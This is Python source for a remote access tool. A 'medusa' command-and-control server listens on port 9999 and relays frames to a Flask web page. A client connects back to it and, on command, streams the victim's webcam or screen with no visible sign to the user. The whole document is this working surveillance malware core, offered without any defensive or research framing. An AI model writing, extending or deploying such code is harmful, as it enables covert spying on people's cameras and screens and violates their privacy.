import socket
import threading
import time
from flask import Flask, Response, render_template_string, request
from colorama import Fore, Style, init
import cv2
import numpy as np
import signal
import sys

init(autoreset=True)

app = Flask(__name__)
server_thread = None
stop_server_flag = threading.Event()

html_template = """
<!DOCTYPE html>
<html>
<head>
    <title>{{title}}</title>
</head>
<body>
    <h1>{{title}}</h1>
    <img src="{{url}}" width="640" height="480">
</body>
</html>
"""

def start_streaming(client_socket, mode):
    print(Fore.BLUE + "[ * ] Starting...")
    time.sleep(1)
    print(Fore.BLUE + "[ * ] Preparing player...")
    time.sleep(1)

    @app.route('/video_feed')
    def video_feed():
        return Response(generate_frames(client_socket),
                        mimetype='multipart/x-mixed-replace; boundary=frame')

    @app.route('/')
    def index():
        return render_template_string(html_template, title=mode + " Stream", url='/video_feed')

    def run_server():
        app.run(host='0.0.0.0', port=5000, use_reloader=False)

    global server_thread
    server_thread = threading.Thread(target=run_server)
    server_thread.start()

    print(Fore.BLUE + f"Opening player at: http://localhost:5000")
    print(Fore.BLUE + "[ * ] Streaming...")

def generate_frames(client_socket):
    while True:
        data = client_socket.recv(921600)
        if not data:
            break
        frame = cv2.imdecode(np.frombuffer(data, np.uint8), cv2.IMREAD_COLOR)
        ret, buffer = cv2.imencode('.jpg', frame)
        frame = buffer.tobytes()
        yield (b'--frame\r\n'
               b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')

def handle_client(client_socket):
    while True:
        try:
            command = input(Fore.MAGENTA + "medusa > ")
        except EOFError:
            # Handle CTRL+D
            stop_server()
            print(Fore.RED + "[ * ] Server stopped.")
            continue
        
        if command == "CTRL+P":
            stop_server()
            print(Fore.RED + "[ * ] Server stopped.")
            continue
        
        client_socket.send(command.encode('utf-8'))
        if command.startswith("webcam_stream") or command.startswith("screen_stream"):
            mode = command.split('_')[0]
            start_streaming(client_socket, mode)

def stop_server():
    stop_server_flag.set()
    func = request.environ.get('werkzeug.server.shutdown')
    if func is None:
        raise RuntimeError('Not running with the Werkzeug Server')
    func()

def main():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('0.0.0.0', 9999))
    server_socket.listen(5)
    print(Fore.GREEN + "[ * ] Listening for incoming connections...")

    while True:
        client_socket, addr = server_socket.accept()
        print(Fore.GREEN + f"[ * ] Connection established from {addr}")
        client_handler = threading.Thread(target=handle_client, args=(client_socket,))
        client_handler.start()

if __name__ == "__main__":
    main()
    
#client

import socket
import cv2
import pyautogui
import numpy as np

def webcam_stream(client_socket):
    cap = cv2.VideoCapture(0)
    while True:
        ret, frame = cap.read()
        if not ret:
            break
        _, buffer = cv2.imencode('.jpg', frame)
        client_socket.sendall(buffer.tobytes())

def screen_stream(client_socket):
    while True:
        screen = pyautogui.screenshot()
        frame = np.array(screen)
        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
        _, buffer = cv2.imencode('.jpg', frame)
        client_socket.sendall(buffer.tobytes())

def main():
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect(('server_ip', 9999))

    while True:
        command = client_socket.recv(1024).decode('utf-8')
        if command == "webcam_stream":
            webcam_stream(client_socket)
        elif command == "screen_stream":
            screen_stream(client_socket)

if __name__ == "__main__":
    main()
